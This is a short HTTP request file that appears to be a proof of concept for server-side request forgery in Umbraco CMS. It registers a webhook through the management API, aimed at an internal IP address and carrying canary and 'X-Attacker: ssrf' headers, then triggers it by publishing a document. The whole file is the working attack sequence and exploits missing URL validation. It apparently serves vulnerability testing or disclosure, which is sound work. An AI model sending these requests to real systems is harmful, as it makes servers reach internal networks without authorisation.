### The webhook registration (as a Settings-section user) — no URL validation
POST http://localhost:29184/umbraco/management/api/v1/webhook HTTP/1.1
Authorization: Bearer <settings-user-token>
Content-Type: application/json

{"url": "http://172.18.0.1:57221/canary-e7adad984b76", "enabled": true, "events": ["Umbraco.ContentPublish"], "headers": {"X-Canary": "e7adad984b76", "X-Attacker": "ssrf"}, "name": "ssrf-open-e7adad984b76"}

### Trigger
PUT http://localhost:29184/umbraco/management/api/v1/document/965aba95-646c-4120-8868-5c7553e98980/publish HTTP/1.1
